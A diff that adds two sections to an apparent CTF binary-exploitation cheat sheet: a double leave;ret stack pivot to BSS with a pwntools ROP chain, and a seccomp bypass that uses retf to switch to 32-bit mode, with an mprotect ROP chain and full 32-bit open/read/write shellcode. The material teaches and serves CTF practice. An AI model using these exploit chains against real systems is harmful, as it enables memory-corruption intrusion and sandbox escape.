@@ -10,7 +10,9 @@
 - [Bad Character Bypass via XOR Encoding in ROP (Crypto-Cat)](#bad-character-bypass-via-xor-encoding-in-rop-crypto-cat)
 - [Exotic x86 Gadgets — BEXTR/XLAT/STOSB/PEXT (Crypto-Cat)](#exotic-x86-gadgets--bextrxlatstosb-pext-crypto-cat)
 - [Stack Pivot via xchg rax,esp (Crypto-Cat)](#stack-pivot-via-xchg-raxesp-crypto-cat)
+- [Double Stack Pivot to BSS via leave;ret (Midnightflag 2026)](#double-stack-pivot-to-bss-via-leaveret-midnightflag-2026)
 - [Seccomp Bypass](#seccomp-bypass)
+- [RETF Architecture Switch for Seccomp Bypass (Midnightflag 2026)](#retf-architecture-switch-for-seccomp-bypass-midnightflag-2026)
 - [Stack Shellcode with Input Reversal](#stack-shellcode-with-input-reversal)
 - [.fini_array Hijack](#fini_array-hijack)
 - [pwntools Template](#pwntools-template)
@@ -358,6 +360,44 @@ payload = flat(
 
 ---
 
+## Double Stack Pivot to BSS via leave;ret (Midnightflag 2026)
+
+**Pattern (Eyeless):** Small stack overflow (22 bytes past buffer) — enough to overwrite RBP + RIP but too small for a ROP chain. No libc leak available. Use two `leave; ret` pivots to relocate execution to BSS, then chain `fgets` calls to write arbitrary-length ROP.
+
+**Stage 1 — Pivot to BSS:**
+```python
+BSS_STAGE = 0x404500  # writable BSS address
+LEAVE_RET = 0x4013d9  # leave; ret gadget
+
+# Overflow: 128-byte buffer + RBP + RIP
+payload = b'A' * 128
+payload += p64(BSS_STAGE)   # overwrite RBP → BSS
+payload += p64(LEAVE_RET)   # leave sets RSP = RBP (BSS), then ret
+```
+
+**Stage 2 — Chain fgets for large ROP:**
+```python
+# After pivot, RSP is at BSS_STAGE. Pre-place a mini-ROP there that
+# calls fgets(BSS+0x600, 0x700, stdin) to read the real ROP chain:
+POP_RDI = 0x4013a5
+POP_RSI_R15 = 0x4013a3
+SET_RDX_STDIN = 0x40136a  # gadget that sets rdx = stdin FILE*
+
+stage2 = flat(
+    SET_RDX_STDIN,
+    POP_RDI, BSS_STAGE + 0x100,  # destination buffer
+    POP_RSI_R15, 0x700, 0,       # size
+    elf.plt['fgets'],             # fgets(buf, 0x700, stdin)
+    BSS_STAGE + 0x100,            # return into the new ROP chain
+)
+```
+
+**Key insight:** `leave; ret` is equivalent to `mov rsp, rbp; pop rbp; ret`. Overwriting RBP controls where RSP lands after `leave`. Two pivots solve the "too small for ROP" problem: first pivot moves to BSS where a small bootstrap ROP calls `fgets` to load the full exploit.
+
+**When to use:** Overflow is too small for a full ROP chain AND the binary uses `fgets`/`read` (or similar input function) that can be called via PLT. BSS is always writable and at a known address (no PIE or PIE leaked).
+
+---
+
 ## SROP with UTF-8 Payload Constraints (DiceCTF 2026)
 
 **Pattern (Message Store):** Rust binary where OOB color index reads memcpy from GOT, causing `memcpy(stack, BUFFER, 0x1000)` — a massive stack overflow. But `from_utf8_lossy()` validates the buffer first: any invalid UTF-8 triggers `Cow::Owned` with corrupted replacement data. **The entire 0x1000-byte payload must be valid UTF-8.**
@@ -404,6 +444,71 @@ Alternative syscalls when seccomp blocks `open()`/`read()`:
 **Check rules:** `seccomp-tools dump ./binary`
 
 See [advanced.md](advanced.md) for: conditional buffer address restrictions, shellcode construction without relocations (call/pop trick), seccomp analysis from disassembly, `scmp_arg_cmp` struct layout.
+
+## RETF Architecture Switch for Seccomp Bypass (Midnightflag 2026)
+
+**Pattern (Eyeless):** Seccomp blocks `execve`, `execveat`, `open`, `openat` in 64-bit mode. Switch to 32-bit (IA-32e compatibility mode) where syscall numbers differ and the filter does not apply.
+
+**How it works:** The `retf` (far return) instruction pops RIP then CS from the stack. Setting `CS = 0x23` switches the CPU to 32-bit compatibility mode. In 32-bit mode, `int 0x80` uses different syscall numbers: `open=5`, `read=3`, `write=4`, `exit=1`.
+
+**ROP chain to switch modes:**
+```python
+POP_RDX_RBX = libc_base + 0x8f0c5  # pop rdx; pop rbx; ret
+POP_RDI     = 0x4013a5
+POP_RSI_R15 = 0x4013a3
+RETF        = libc_base + 0x294bf   # retf gadget in libc
+
+# Step 1: mprotect BSS as RWX for shellcode
+rop  = flat(POP_RDI, 0x404000)          # addr = BSS page
+rop += flat(POP_RSI_R15, 0x1000, 0)     # size = page
+rop += flat(POP_RDX_RBX, 7, 0)          # prot = RWX
+rop += flat(libc_base + libc.sym.mprotect)
+
+# Step 2: Far return to 32-bit shellcode on BSS
+rop += flat(RETF)
+rop += p32(0x404a80)   # 32-bit EIP (shellcode address on BSS)
+rop += p32(0x23)        # CS = 0x23 (IA-32e compatibility mode)
+```
+
+**32-bit shellcode (open/read/write flag):**
+```nasm
+mov esp, 0x404100       ; set up 32-bit stack
+push 0x67616c66         ; "flag" (reversed)
+push 0x2f2f2f2f         ; "////"
+mov ebx, esp            ; ebx = filename pointer
+
+mov eax, 5              ; SYS_open (32-bit)
+xor ecx, ecx            ; O_RDONLY
+int 0x80                ; open("////flag", O_RDONLY)
+
+mov ebx, eax            ; fd from open
+mov ecx, esp            ; buffer
+mov edx, 0x100          ; size
+mov eax, 3              ; SYS_read (32-bit)
+int 0x80
+
+mov edx, eax            ; bytes read
+mov ecx, esp            ; buffer
+mov ebx, 1              ; stdout
+mov eax, 4              ; SYS_write (32-bit)
+int 0x80
+
+mov eax, 1              ; SYS_exit
+int 0x80
+```
+
+**Key insight:** Seccomp filters configured for `AUDIT_ARCH_X86_64` do not check 32-bit `int 0x80` syscalls. The `retf` gadget (found in libc) switches architecture by loading CS=0x23. Requires making a memory region executable first via `mprotect`, since 32-bit shellcode must run from writable+executable memory.
+
+**Finding retf in libc:**
+```bash
+ROPgadget --binary libc.so.6 | grep retf
+# Or search for byte 0xcb:
+objdump -d libc.so.6 | grep -w retf
+```
+
+**When to use:** Seccomp blocks critical 64-bit syscalls (`open`, `openat`, `execve`) but does not use `SECCOMP_FILTER_FLAG_SPEC_ALLOW` or check `AUDIT_ARCH`. Combine with `mprotect` to make BSS/heap executable for the 32-bit shellcode.
+
+---
 
 ## Stack Shellcode with Input Reversal
 
